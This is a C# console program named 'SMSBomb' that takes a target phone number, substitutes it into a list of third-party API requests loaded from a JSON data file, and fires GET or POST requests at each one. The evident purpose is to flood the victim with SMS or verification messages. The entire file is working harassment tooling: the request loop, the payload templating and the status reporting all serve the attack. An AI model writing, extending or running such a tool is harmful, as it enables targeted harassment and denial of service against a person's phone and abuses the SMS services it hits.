using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace SMSBomb
{
    class Program
    {
        private static string PhoneNumber;
        private static List<ApiItem> ApiItems;
        private static int Space = 2;
        static async Task Main(string[] args)
        {
            PhoneNumber = args[0];

            Initial();
            await SendRequests();

            Console.WriteLine("Press Any Key To Exit ...");
            Console.ReadKey();
        }
        static async Task SendRequests()
        {
            Console.WriteLine("Status".PadRight("Status".Length + Space) + "Method".PadRight("Method".Length + Space) + "Title");
            Console.WriteLine("---------------------");

            HttpRequest request = new();
            foreach (var item in ApiItems)
            {
                switch (item.Method.ToLower().Trim())
                {
                    case "post":
                        await request.Post(item);
                        break;
                    default:
                        await request.Get(item);
                        break;
                }
            }
        }
        static void Initial()
        {
            var datapath = Path.Combine(Directory.GetCurrentDirectory(), "AppData", "Data.Json");
            var text = File.ReadAllText(datapath);
            ApiItems = JsonSerializer.Deserialize<List<ApiItem>>(text).Where(p => p.Enable).ToList();
            ApiItems.ForEach(a => a.Build(PhoneNumber));
        }
    }

    public class HttpRequest
    {
        private readonly HttpClient client = new();
        private static int Space = 2;
        public async Task Get(ApiItem item)
        {
            try
            {
                using (var response = await client.GetAsync(item.Url))
                {
                    Print(((int)response.StatusCode).ToString(), item);
                }
            }
            catch (Exception)
            {
                Print("Error", item);
            }
        }
        public async Task Post(ApiItem item)
        {
            try
            {
                var content = new StringContent(item.Payload, Encoding.UTF8, "application/json");
                using (var response = await client.PostAsync(item.Url, content))
                {
                    Print(((int)response.StatusCode).ToString(), item);
                }
            }
            catch (Exception)
            {
                Print("Error", item);
            }
        }
        private void Print(string status, ApiItem item)
        {
            Console.WriteLine(status.PadRight("Status".Length + Space) + item.Method.PadRight("Method".Length + Space) + item.Title);
        }
    }
}
public class ApiItem
{
    public bool Enable { get; set; }
    public string Title { get; set; }
    public string Method { get; set; }
    public string Url { get; set; }
    public string Payload { get; set; }
    public string PhoneNumberParameter { get; set; }
    public void Build(string phoneNumber)
    {
        Url = Url?.Replace(PhoneNumberParameter, phoneNumber);
        Payload = Payload?.Replace(PhoneNumberParameter, phoneNumber);
    }
}